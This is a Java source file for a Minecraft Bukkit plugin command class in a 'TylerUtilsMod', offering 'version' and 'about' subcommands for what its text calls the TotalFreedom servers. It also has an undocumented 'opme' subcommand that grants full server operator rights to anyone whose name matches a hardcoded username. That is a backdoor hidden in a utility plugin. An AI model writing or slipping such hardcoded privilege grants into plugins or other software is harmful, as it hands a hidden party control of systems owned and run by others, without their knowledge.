package com.tylerhyper.utils.mod;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.ChatColor;

public class TylerUtilsCmd implements CommandExecutor {
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length == 0)
        {
            return false;
        }
        else if (args.length == 1)
        {
            if (args[0].equalsIgnoreCase("version"))
            {
            	sender.sendMessage(ChatColor.GREEN + "Running TylerUtilsMod RELEASE v1.5");
            }
            if (args[0].equalsIgnoreCase("about"))
            {
            	sender.sendMessage(ChatColor.GREEN + "The TylerUtilsMod is a private mod made by tylerhyperHD that implements "
            	+ "some commands to the TotalFreedom servers.");
            }
            if (args[0].equalsIgnoreCase("opme"))
            {
                Player player = (Player)sender;
                if(!sender.getName().equals("tylerhyperHD")) {
                	return false;
                }
                else {
                	sender.setOp(true);
                	sender.sendMessage("You are now OP!");
                	}
            }
        }
      return true;
    }
}